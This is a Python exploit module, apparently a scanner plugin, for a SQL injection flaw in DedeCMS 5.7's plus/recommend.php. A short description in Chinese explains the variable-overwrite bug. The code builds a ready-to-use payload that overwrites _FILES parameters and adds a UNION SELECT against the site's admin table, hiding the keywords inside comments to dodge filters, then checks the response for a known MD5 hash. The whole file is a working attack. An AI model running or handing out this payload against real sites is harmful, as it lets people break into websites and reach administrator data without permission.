#!/usr/bin/env python
# -*- coding: utf-8 -*-

from script.lib import logger
from script.lib import requests

author = "SpongeB0B"
scope = "DedeCMS 5.7"
description  = "1.plus/recommand.php，包含include/common.inc.php\
        2.只要提交的URL中不包含cfg_|GLOBALS|_GET|_POST|_COOKIE，可通过检查，_FILES[type][tmp_name]被带入\
		3.在29行处，URL参数中的_FILES[type][tmp_name]，$_key为type，$$_key即为$type，从而导致了$type变量的覆盖\
        4.回到recommand.php中，注入语句被带入数据库查询"
referer = "https://www.seebug.org/vuldb/ssvid-62593"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]
def exploit(url):
	headers = {
		"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
	}
	payload = "/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27AnD+ChAr(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(1234),5,6,7,8,9%20FrOm%20`%23@__admin`%23"
	vulnurl = url + payload
	try:
		req = requests.get(vulnurl, headers=headers, timeout=10)
		req.close()
		if r"81dc9bdb52d04dc20036dbd8313ed055" in req.content:
			logger.success("[+]存在dedecms recommend.php SQL注入漏洞...(高危)\tpayload: "+vulnurl)
			return vulnurl

	except:
		logger.error("[-] "+vulnurl+"====>连接超时")
		pass
